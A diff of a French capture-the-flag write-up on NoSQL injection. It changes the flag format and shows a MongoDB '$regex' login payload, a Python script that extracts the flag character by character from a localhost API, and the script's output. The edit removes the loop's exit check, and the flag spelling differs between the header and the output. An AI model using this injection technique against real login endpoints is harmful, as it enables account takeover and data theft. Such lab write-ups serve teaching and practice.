@@ -10,7 +10,7 @@ Our security team has yet to approve it for production, but I really think we di
 
 Checkout our documentation to get started! `URL DU CHALLENGE/docs`
 
-FLAG: `FLAG{N0SQL_D0ESNT_M3AN_N0_SQLi}`
+FLAG: `FLAG-N0SQL_D0ESNT_M3AN_N0_SQLi`
 
 ## Outils nécessaires
 
@@ -61,14 +61,14 @@ Exemple:
 {
   "email": "admin@unite.com",
   "password": {
-    "$regex": "FLAG{(.*)}"
+    "$regex": "FLAG-(.*)"
   }
 }
 ```
 
 Qui nous retourne la même réponse (200) mentionnée plus haut.
 
-Maintenant, nous savons que le flag est du format FLAG{...}, nous savons aussi qu'une requête réussie nous retourne un
+Maintenant, nous savons que le flag est du format FLAG-..., nous savons aussi qu'une requête réussie nous retourne un
 code de 200 et la clé API, donc nous pouvons écrire une fonction qui nous permet d'exécuter des requêtes pour
 extraire les lettres entre les deux accolades :
 
@@ -77,7 +77,7 @@ import requests
 
 flag_letters = 'abcdefghijklmnopqrstuvxwyzABCDEFGHIJKLMNOPQRSTUVXWYZ0123456789_-{}'
 index = 0
-flag = "FLAG-{"
+flag = "FLAG-"
 url = "http://localhost:3000/api_key"
 headers = {'Content-type': 'application/json'}
 while True:
@@ -88,18 +88,15 @@ while True:
         if "API_KEY" in response.text:
             flag = flag + letter
             print(flag)
-            if letter == "}":
-                print("Total requests: " + str(index))
-                exit(0)
 ```
 
 Qui nous retourne donc quelque chose comme ça:
 
 ```bash
-FLAG{N
-FLAG{No
-FLAG{No5
-FLAG{No5Q
-... 
-FLAG{No5QL_D0ESNT_M3AN_N0_SQLi}
+FLAG-N
+FLAG-No
+FLAG-No5
+FLAG-No5Q
+...
+FLAG-No5QL_D0ESNT_M3AN_N0_SQLi
 ```
